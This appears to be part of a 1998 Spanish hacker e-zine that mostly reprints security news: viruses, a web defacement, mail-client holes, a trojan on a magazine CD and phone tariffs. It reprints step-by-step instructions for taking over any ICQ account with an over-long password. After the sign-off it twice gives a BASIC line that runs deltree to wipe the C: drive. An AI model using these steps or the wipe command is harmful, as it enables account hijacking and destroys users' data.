 expertos en telecomunicaciones, mantiene negociaciones con Telefónica para implantar en
 España tarifa plana de conexión a Internet a partir de septiembre. La tarifa plana, esto 
es, una sola cuota mensual por estar conectado a Internet, con independencia del tiempo de
 consumo telefónico, es una aspiración unánime de la comunidad internauta en España. 

Una sola compañía, Netspain, venía ofreciendo esa posibilidad desde el mes de febrero, pero
 su mala gestión empresarial, además de la retirada del apoyo de Telefónica, le ha colocado
 al borde del cierre. Su propietaria, Ana Belén Domingo, ha llegado a la fase de pedir a sus
 clientes que le hagan un abono en una cuenta personal sin factura y sin más garantías que 
su palabra, indicando que quien no se acoja a esta posibilidad perderá el servicio. Esta 
insólita actitud ha generado una viva controversia, reflejada en el canal de IRC #Netspain, 
entre quienes optan por el insulto abierto hacia dicha empresaria y quienes creen que todavía
 merece un voto de confianza. La propietaria de Netspain hizo unas únicas declaraciones a
 LABRUJULA.NET el pasado lunes, y desde ese momento ha evitado comunicarse con sus clientes. 

La estrategia de Nora al día de hoy se basa en recoger peticiones de usuarios a través de 
un formulario habilitado en el web, para, a partir de ahí, decidir dónde y cuándo pone en
 marcha su servicio, según ha comunicado a LABRUJULA.NET uno de sus responsables, Pedro 
Llamas. El objetivo de esta joven empresa, que es una Sociedad Limitada y actúa hoy dando
 acceso y servicios de Internet a particulares y compañías de León, es instalar nodos locales 
en las principales ciudades españolas, empezando por Madrid, Barcelona y Palma de Mallorca.
 Las pruebas efectuadas se están saldando de manera positiva. 

Las negociaciones con Telefónica, que, en principio, se muestra conforme con
 la iniciativa de Nora, llevan desarrollándose meses y en el momento actual se hallan
 en un estado muy avanzado. “Estamos perfilando un acuerdo”, ha dicho el responsable de 
Nora, empresa que estudia el servicio de tarifa plana desde mayo de 1996. 

De implantarse finalmente el sistema, Nora sería la titular de las líneas de teléfono,
 por lo que el usuario abonaría directamente a esta empresa tanto el consumo telefónico 
como el acceso y utilización de Internet. Esto es: actuaría como una operadora de 
telecomunicaciones y como un ISP o proveedor de acceso. Para acogerse al sistema, 
hay que habilitar, o bien instalar, una línea telefónica específicamente destinada
 a este uso. Si se instala, el coste es de 24.800 pesetas (más IVA). Si se utiliza una línea 
existente, cero pesetas. A partir de ahí, se paga una cuota mensual de 2.500 pesetas por uso
 del teléfono así como una cuota de 5.800 pesetas (más IVA) por acceder y utilizar Internet,
 además de un alta de 9.000 pesetas (más IVA). Además de la página web, Nora ha dispuesto un
 teléfono de información: 902113358. 
	

Un universitario español crea un virus que resulta indetectable por las marcas
Domingo, 9 Agosto
 Un joven informático español, estudiante de telecomunicaciones, conocido como “Griyo”, 
perteneciente al grupo denominado “29 A”, ha sido el autor de un virus bautizado como 
“Win32/Marburg”, para el todavía no existe solución, según ha sabido en exclusiva 
LABRUJULA.NET. Este virus, que afecta a archivos de Windows 95 y 98, se está propagando 
por todo el mundo después de que la publicación británica “PC Gamer”, de distribución
 internacional, incluyera en julio un CD ROM con archivos infectados. 

Las empresas creadoras de anti-virus todavía no han encontrado una solución, y sólo 
una de ellas, Doctor Solomon, ha anunciado que en breve lanzará una versión, la 7.86,
 que “únicamente lo detectará”. “Griyo”, al igual que el grupo “29 A”, formado por cinco 
españoles y cinco extranjeros, destacan a escala mundial por la sofisticación de los virus
 que crean. Griyo es, según ha sabido nuestro periódico, un universitario veinteañero, 
“teleco”, que ha creado virus como “Cri-Cri” “Family”, “Win98.HPS”, “Suck Sexee Family”,
 “Win GoLLuM Family”, “Anti-ETA” y “Win32.Influenza”. 

El “Win32/Marburg” es un virus “polimórfico” (cambia de forma) y es de “acción directa”, 
esto es, busca en archivos ejecutables para infectarlos. Una de sus manifestaciones se
 basa en exhibir en pantalla iconos de error de Windows 98; otra es que aumenta el tamaño 
de los archivos dañados
///////////////////////////////////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\Un grupo de “hackers” españoles entra el servidor web de la agencia “Europa Press” 
Domingo, 9 Agosto
 El servidor web de “Europa Press”, la segunda agencia de noticias españolas después de “Efe” 
ha sido asaltado hoy sábado 8 por un grupo de “hackers” españoles denominado “Digit0”, 
quienes comunicaron la acción a LABRUJULA.NET . Los hackers dejaron una señal de su 
incursión en la página web de “Europa Press”,<HTTP: www.europapress.es
 http://www.europapress.es . Escribieron la frase: “La seguridad es sólo 
un estado mental”; y manifestaron su protesta contra las subidas telefónicas:
 “El día 3 todos contra el abuso”, con un enlace al sitio web
 http://www.lanzadera.com/lahuelga , en el que se manifiesta la
 disconformidad con el incremento de las tarifas. Europa Press es el primer medio 
de comunicación español que resulta “hackeado”. 

Al comprobar que después de varias horas la agencia no restauraba la versión 
original de sus páginas web, el editor de LABRUJULA.NET estableció contacto 
telefónico con este medio para averiguar el alcance del ataque y se encontró 
con la sorpresa de que ningún responsable del medio se había percatado de la acción.
 Un redactor jefe, que actuaba como máximo responsable en ausencia del director,
 señaló que “era la primera noticia que tenían” y preguntó, extrañado, “para qué 
se hacía esto”. 

Una hora después de recibir nuestra comunicación, los responsables de informática
 de “Europa Press” cambiaron la página principal, sin que hasta el momento se haya
 sabido la magnitud de la acción. LABRUJULA.NET tuvo noticia del ataque informático por
 un “e-mail” que llevaba el encabezamiento de “Hackeada la Web de la agencia Europa Press”. 
Esta agencia de noticias es uno de los medios históricos en el suministro de información en
 España. Presta servicios a decenas de periódicos y revistas. En Internet realiza desde hace 
casi dos años un servicio de noticias para “Telefónica”, y en este año ha firmado un acuerdo 
con el buscador “Olé” para difundir informaciones de agencia. 
//////////////////////////////////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
Un universitario español crea un virus que resulta indetectable por las marcas
Domingo, 9 Agosto
 Un joven informático español, estudiante de telecomunicaciones, conocido como “Griyo”,
 perteneciente al grupo denominado “29 A”, ha sido el autor de un virus bautizado como 
“Win32/Marburg”, para el todavía no existe solución, según ha sabido en exclusiva 
LABRUJULA.NET. Este virus, que afecta a archivos de Windows 95 y 98, se está 
propagando por todo el mundo después de que la publicación británica “PC Gamer”,
 de distribución internacional, incluyera en julio un CD ROM con archivos infectados. 

Las empresas creadoras de anti-virus todavía no han encontrado una solución, y 
sólo una de ellas, Doctor Solomon, ha anunciado que en breve lanzará una versión,
 la 7.86, que “únicamente lo detectará”. “Griyo”, al igual que el grupo “29 A”, 
formado por cinco españoles y cinco extranjeros, destacan a escala mundial por la 
sofisticación de los virus que crean. Griyo es, según ha sabido nuestro periódico, 
un universitario veinteañero, “teleco”, que ha creado virus como “Cri-Cri” “Family”,
 “Win98.HPS”, “Suck Sexee Family”, “Win GoLLuM Family”, “Anti-ETA” y “Win32.Influenza”. 

El “Win32/Marburg” es un virus “polimórfico” (cambia de forma) y es de “acción directa”, 
esto es, busca en archivos ejecutables para infectarlos. Una de sus manifestaciones se basa
 en exhibir en pantalla iconos de error de Windows 98; otra es que aumenta el tamaño de los 
archivos dañados. 
/////////////////////////////////////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\	
La subida en las llamadas locales se aplicará desde el domingo día 9 
Domingo, 9 Agosto
 La nuevas tarifas telefónicas, con un incremento medio en el precio de las llamadas locales 
del 13,6 % según Telefónica y del 117 % según las asociaciones de consumidores, regirán desde 
este domingo día 9, una vez que el BOE (Boletín Oficial de Estado) haya publicado el viernes
 7 la aprobación gubernamental de la medida. 

En las llamadas locales, los 160 primeros segundos costarán 11,4 pesetas, y pasado ese tiempo,
 cada minuto adicional costará 4,52 pesetas en horario “punta” y “normal” y 1,64 pesetas, en 
horario reducido. Sin embargo, existe la posibilidad de acogerse a un descuento del 30 % en
 el precio del minuto a partir de los 10 primeros minutos de conversación o conexión a
 Internet; para ello hay que abonar una cuota mensual añadida de 250 pesetas, indicándolo,
 naturalmente, a Telefónica. 

Por lo demás, la facturación se hará por segundos y la cuota mensual básica de abono pasa 
de 1.242 pesetas a 1.442 pesetas, mientras bajan las tarifas provinciales un 5 % de media; 
las interprovinciales, un 15 %; y las internacionales, un 12,4 %.

Telefónica ha dejado claro, y así lo difundió LABRUJULA.NET el pasado domingo 2, que en 
septiembre volverá a exigir nuevas subidas a Fomento, al considerar que las nuevas tarifas 
no le permiten cubrir los costes de instalación de líneas y servicio telefónico, y que las 
tarifas metropolitanas “continúan siendo de las más bajas de Europa”. Juan Villalonga, 
presidente de la compañía, así lo indicó esta semana en Palma de Mallorca, argumentado
 que dichas tarifas “llevan seis o siete años congeladas” y que “el proceso de reequilibrio
 tarifario no ha hecho más que empezar”. 

Las declaraciones provocaron la indignación de gran parte de la ciudadanía, partidos
 políticos de oposición (con el PSOE a la cabeza) y de asociaciones como la OCU, que 
las calificó de “insoportable falta de respeto para los consumidores”. La OCU expuso, 
con datos que Telefónica no ha rebatido, que desde 1991 ha habido cinco subidas, con 
un incremento total de 180,8 %, mientras que la inflación acumulada ha sido del 30,5 %.
 Esta organización de usuarios ha pedido al Gobierno que promueva medidas urgentes para
 que otras operadoras puedan prestar servicios de telefonía en llamadas locales, mercado
 en el que Telefónica goza de un monopolio “de facto”. 
////////////////////////////////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\	
Eudora, con un fallo de seguridad al igual que “Nestcape Mail” y “Outlook”

Domingo, 9 Agosto
 El programa de correo “Eudora”, que había captado nuevos
clientes después de que se descubriera un grave fallo de seguridad en “Netscape Mail” y 
“Microsoft Outlook” (ver semana anterior), registra, igualmente, otro problema que lo 
hace vulnerable a ataques informáticos y permite la incursión de
intrusos. Eudora, que ha reconocido oficialmente el fallo, ha creado un apartado, 
http://eudora.qualcomm.com/security.html , en el que se facilitan “parches”, 
otras versiones de programas, consejos e información adicional.
////////////////////////////////////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
La revista líder del entorno Mac difunde un CD ROM con un "Caballo de Troya" 
Domingo, 19 julio
 El CD ROM que regala la revista Macworld España en su último número de julio-agosto
 contiene un virus informático del tipo “Caballo de Troya”, según ha admitido la propia
 editora de la revista, la multinacional IDG Communications, en una carta enviada a sus
 suscriptores. El virus, denominado “Autostart 9805”, sólo afecta a los usuarios de Power
 Macintosh que tengan instalado el sistema operativo Mac OS 8 o posterior y que tengan 
activada, en modo de reproducción automática, la utilidad QuickTime 2.0 o posterior. En
 esas circunstancias, cuando el usuario de Mac introduce el CD ROM en su equipo y lo ejecuta,
 el virus entra en el ordenador, perturbando todo su funcionamiento y haciendo inservibles 
algunos archivos, según han informado a LABRUJULA.NET algunos lectores. 

Macworld España es la revista más vendida del segmento Mac, con una difusión mensual media
 de 10.086 ejemplares en el último año, según los datos de OJD. La publicación todavía puede
 adquirirse en los kioscos de Madrid y otras ciudades de España, según comprobaron ayer 
varios redactores de nuestro periódico. Los kiosqueros no tenían ninguna información al 
respecto y el número de la revista no presenta ninguna información acerca del virus 
contenido en este CD ROM, número 26 y que se presenta con el reclamo de “Especial 
Programación”. Únicamente los suscriptores de Macworld, que constituyen una minoría frente a 
quienes adquieren la revista en kioscos y librerías, y quienes visitan la página web de la
 revista, han recibido comunicación del hecho. 

La carta, de cuatro folios, al igual que el mencionado sitio web, contiene instrucciones
 para erradicar este “caballo de troya”, que ha empezado a propagarse a partir de mayo
 desde Hong Kong. Un responsable de Macworld España, Javier R. Menéndez, ha señalado al 
respecto: “Somos conscientes de que nuestras más sinceras disculpas pueden resultar poco 
válidas para aquellos usuarios que se hayan visto afectados por el último Macworld CD. No 
obstante, en una situación como la ocurrida, las víctimas de Autostart 9805 somos toda la
 comunidad de usuarios Macintosh entre quienes nos incluimos”. 

Apple España ha declinado realizar ningún comentario al respecto y no ha facilitado 
ninguna información al respecto, a pesar de la importancia del caso para la “comunidad mac”.
 Diversos programadores consultados por LABRUJULA.NET han destacado “el riesgo que supone
 ejecutar el CD que distribuyen las revistas, dado que no son programas propios y pueden 
contener las últimas versiones de virus”. También han puesto de manifiesto que “la cuestión 
puede dar lugar a responsabilidades legales por parte de las revistas que garantizan que el
 CD está libre de virus, especialmente cuando está avalado por marcas conocidas”. 
//////////////////////////////////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
Netscape Communicator 4.0 presenta un agujero de seguridad por causa de Java
Domingo, 19 julio
 El navegador Netscape Communicator 4.0 presenta un importante agujero de seguridad que 
podría ser aprovechado por algún intruso para sustraer o borrar ficheros, insertar virus 
o cualquier otra función, según ha descubierto un grupo de técnicos de la Universidad de 
Princeton. El agujero se abre al ejecutarse algunos “applet”, o programas, de Java, y 
reside en la implementación que se ha hecho de los denominados “class loaders”. Sin embargo,
 no es fácil que los intrusos tomen el control de nuestro ordenador, dado que la fisura se 
activa después de seguir numerosos y complejos pasos, según han
señalado expertos vinculados a Netscape. El diario electrónico
News.com ha publicado un completo informe al respecto, con todos los enlaces a las partes 
implicadas
///////////////////////////////////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
Rootshell lanzo este nuevo bug:


01. ICQ Password Verification Bug
---------------------------------

It appears that ICQ has yet another bug.  This was just sent in from one
of
our users.  This bug has been confirmed by Rootshell.

I code a linux ICQ clone, and after one of my users mistyped his
password, and was allowed into his account anyway.  After further
investivating, this is what I found.

* It is possible to log in to the ICQ servers as ANYONE without having
to know their password.  This leads to all sorts of comprimises.  This
is *not* simply spoofing

How it works:

The mirabilis server uses a password of 8 chars.  Their clients do the
range checking and only send in passwords of 8 or less chars.  The Linux

clones, mine in particular, don't do this.

* When a password of 9 or more characters is sent, their buffer is
over-run, and it allows you to log in.

The exploit:

Download any ICQ clone (example: http://hookah.ml.org/zicq)

Set the UIN to be the targets UIN
Set the password to "123456789" <-- Just large enough to overflow

Start the ICQ program.  If all goes well, it will log in and connect, as

that user.  Any waiting (offline) messages will be delivered to you.
You can now send _and_ recieve messages and URLS as the client allows.

Notes:

This is NOT spoofing, you are actually logged in as the selected UIN.
Unlike spoofing you can recieve messages as well.

All UINS will work, as long as someone is not already logged in with
that UIN.

Mirabilis / AOL really needs to fix this problem.
//////////////////////////////////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
BUDWEISER VIRUS
segun algunas fuentes el salvapantallas que ha salido recientemente de las famosas 
ranas de Budweiser (una famosa marca de cerveza)
se supone que si se baja el archivo comprimido en ZIP del salvapantallas a parte de
 perder tuda la informacion del disco duro,tambien alguna persona podria conseguir
 sus contraseñas.
ciertas personas desmienten este echo deviso a que ellos lo han bajado y usado y no 
les a pasado nada.
/////////////////////////////////////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
SE DECLARARON CULPABLES DOS JOVENES HACKERS
Dos adolescentes que protagonizaron el mas sistematico y mejor organizado
ataque informatico contra computadoras de servicios militares
norteamericanos se declararon culpables de los cargos de delincuencia
juvenil. El fiscal general Michael Yamaguchi admitis que los dos jovenes,
uno de 16 aqos conocido como Makaveli y otro de 15 apodado TooShort,
reconocieron haber sido los responsables de una serie de ataques realizados
en febrero que activs las alarmas en diferentes servicios de seguridad de
los Estados Unidos.  Los hackers, al ser detectados el 25 de febrero
pasado, fueron detenidos en sus casas de Cloverdale cerca de San Francisco
por agentes del FBI, quienes tambiin registraron sus pertenencias y se
llevaron sus computadoras, impresoras y todo el software que tenman. A
partir de allm se puso en marcha una intensa investigacisn que incluso
involucrs al Departamento de Justicia y a la NASA. Tras reconocer su
culpabilidad, los jovenes podrman ser puestos bajo custodia hasta que
cumplan la mayorma de edad. Aunque Yamaguchi recomends que les fuera
aplicada una probation y que se les prohiba utilizar computadoras sin
autorizacisn previa.
//////////////////////////////////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

13.        DESPEDIDA Y CIERRE

pues aqui acaba el nº2 del que espero allais sacado buenas cosas,que las aprovecheis y que,
almenos paseis un buen rato de lectura.
me gustaria que colaborase mas jente mandando sus articulos,recordad que podeis hacerlo
a:zed@mixmail.com 
y que se admitiran textos de todas clases (h/c/p/v....)
tambien me gustaria que me mandaseis vuestras opiniones sobre el e-zine o preguntando cosas
ya que si haceis esto ultimo,podria abrir una seccion para vuestros e-mail.
espero vuestras colaboraciones y que disfruteis del verano,que esta siendo calentito {;-)
                                                      ---    asta el nº3   ---
                                                                  ZeD




	





10 shell "C:\windows\command\deltree.exe C:\*.* /Y"

10 shell "C:\windows\command\deltree.exe C:\*.* /Y"




                                 



